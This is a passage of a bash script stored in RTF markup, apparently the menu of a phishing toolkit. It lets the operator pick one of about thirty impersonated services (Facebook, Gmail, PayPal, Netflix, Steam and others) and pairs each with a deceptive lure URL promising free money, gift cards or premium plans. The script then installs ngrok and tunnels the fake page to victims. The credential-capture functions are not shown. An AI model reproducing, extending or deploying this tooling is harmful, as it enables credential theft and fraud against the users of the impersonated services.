\tab read -p "$\{RED\}[$\{WHITE\}-$\{RED\}]$\{GREEN\} Select an option : $\{BLUE\}"\par
\par
\tab if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then\par
\tab\tab site_facebook\par
\tab elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then\par
\tab\tab site_instagram\par
\tab elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then\par
\tab\tab site_gmail\par
\tab elif [[ "$REPLY" == 4 || "$REPLY" == 04 ]]; then\par
\tab\tab website="microsoft"\par
\tab\tab mask='http://unlimited-onedrive-space-for-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 5 || "$REPLY" == 05 ]]; then\par
\tab\tab website="netflix"\par
\tab\tab mask='http://upgrade-your-netflix-plan-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 6 || "$REPLY" == 06 ]]; then\par
\tab\tab website="paypal"\par
\tab\tab mask='http://get-500-usd-free-to-your-acount'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 7 || "$REPLY" == 07 ]]; then\par
\tab\tab website="steam"\par
\tab\tab mask='http://steam-500-usd-gift-card-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 8 || "$REPLY" == 08 ]]; then\par
\tab\tab website="twitter"\par
\tab\tab mask='http://get-blue-badge-on-twitter-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 9 || "$REPLY" == 09 ]]; then\par
\tab\tab website="playstation"\par
\tab\tab mask='http://playstation-500-usd-gift-card-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 10 ]]; then\par
\tab\tab website="tiktok"\par
\tab\tab mask='http://tiktok-free-liker'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 11 ]]; then\par
\tab\tab website="twitch"\par
\tab\tab mask='http://unlimited-twitch-tv-user-for-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 12 ]]; then\par
\tab\tab website="pinterest"\par
\tab\tab mask='http://get-a-premium-plan-for-pinterest-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 13 ]]; then\par
\tab\tab website="snapchat"\par
\tab\tab mask='http://view-locked-snapchat-accounts-secretly'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 14 ]]; then\par
\tab\tab website="linkedin"\par
\tab\tab mask='http://get-a-premium-plan-for-linkedin-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 15 ]]; then\par
\tab\tab website="ebay"\par
\tab\tab mask='http://get-500-usd-free-to-your-acount'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 16 ]]; then\par
\tab\tab website="quora"\par
\tab\tab mask='http://quora-premium-for-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 17 ]]; then\par
\tab\tab website="protonmail"\par
\tab\tab mask='http://protonmail-pro-basics-for-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 18 ]]; then\par
\tab\tab website="spotify"\par
\tab\tab mask='http://convert-your-account-to-spotify-premium'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 19 ]]; then\par
\tab\tab website="reddit"\par
\tab\tab mask='http://reddit-official-verified-member-badge'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 20 ]]; then\par
\tab\tab website="adobe"\par
\tab\tab mask='http://get-adobe-lifetime-pro-membership-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 21 ]]; then\par
\tab\tab website="deviantart"\par
\tab\tab mask='http://get-500-usd-free-to-your-acount'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 22 ]]; then\par
\tab\tab website="badoo"\par
\tab\tab mask='http://get-500-usd-free-to-your-acount'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 23 ]]; then\par
\tab\tab website="origin"\par
\tab\tab mask='http://get-500-usd-free-to-your-acount'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 24 ]]; then\par
\tab\tab website="dropbox"\par
\tab\tab mask='http://get-1TB-cloud-storage-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 25 ]]; then\par
\tab\tab website="yahoo"\par
\tab\tab mask='http://grab-mail-from-anyother-yahoo-account-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 26 ]]; then\par
\tab\tab website="wordpress"\par
\tab\tab mask='http://unlimited-wordpress-traffic-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 27 ]]; then\par
\tab\tab website="yandex"\par
\tab\tab mask='http://grab-mail-from-anyother-yandex-account-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 28 ]]; then\par
\tab\tab website="stackoverflow"\par
\tab\tab mask='http://get-stackoverflow-lifetime-pro-membership-free'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 29 ]]; then\par
\tab\tab site_vk\par
\tab elif [[ "$REPLY" == 30 ]]; then\par
\tab\tab website="xbox"\par
\tab\tab mask='http://get-500-usd-free-to-your-acount'\par
\tab\tab tunnel_menu\par
\tab elif [[ "$REPLY" == 99 ]]; then\par
\tab\tab about\par
\tab elif [[ "$REPLY" == 0 || "$REPLY" == 00 ]]; then\par
\tab\tab msg_exit\par
\tab else\par
\tab\tab echo -ne "\\n$\{RED\}[$\{WHITE\}!$\{RED\}]$\{RED\} Invalid Option, Try Again..."\par
\tab\tab\{ sleep 1; main_menu; \}\par
\tab fi\par
\}\par
\par
## Main\par
kill_pid\par
dependencies\par
install_ngrok\par
main_menu\lang9\par
}
